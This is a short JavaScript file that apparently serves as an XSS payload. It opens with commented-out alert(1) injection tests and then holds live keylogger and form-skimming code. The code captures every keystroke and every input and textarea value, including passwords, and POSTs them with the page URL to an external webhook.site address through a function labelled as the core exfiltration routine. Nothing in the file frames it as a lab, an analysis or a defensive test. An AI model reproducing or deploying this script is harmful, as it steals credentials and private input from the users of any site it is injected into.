// "use strict";
// const script = document.createElement("script");
// script.textContent = "alert(1)";
// document.body.append(script);

// const inp = document.createElement("input");
// inp.id = "inp1";
// inp.setAttribute("onfocus", "alert(1)");
// document.body.appendChild(inp);
// inp.focus();
// const element = document.createElement("div");
// element.setAttribute("onmouseover", "alert('XSS mouse over')");
// element.textContent = "hover over here :) ";
// document.body.appendChild(element);
"use strict";

// 💾 Buffer for raw keystrokes
let keyBuffer = "";
let keylogTimeout;

// 📥 Track values from input and textarea fields
document.querySelectorAll("input, textarea").forEach((el) => {
  el.addEventListener("input", () => {
    sendData("input_field", {
      name: el.name || el.id || "unnamed",
      value: el.value,
    });
  });
});

// ⌨️ Log every keystroke (delayed bulk send)
document.body.addEventListener("keydown", (e) => {
  keyBuffer += e.key;

  clearTimeout(keylogTimeout);
  keylogTimeout = setTimeout(() => {
    sendData("keystrokes", {
      typed: keyBuffer,
      time: new Date().toISOString(),
    });
    keyBuffer = "";
  }, 2000); // Send after 2 seconds idle
});

// 🛰️ Core exfiltration function
function sendData(type, payload) {
  fetch("https://webhook.site/3e6eafda-102b-4d00-979a-77b822620962", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type,
      origin: location.href,
      data: payload,
    }),
  });
}
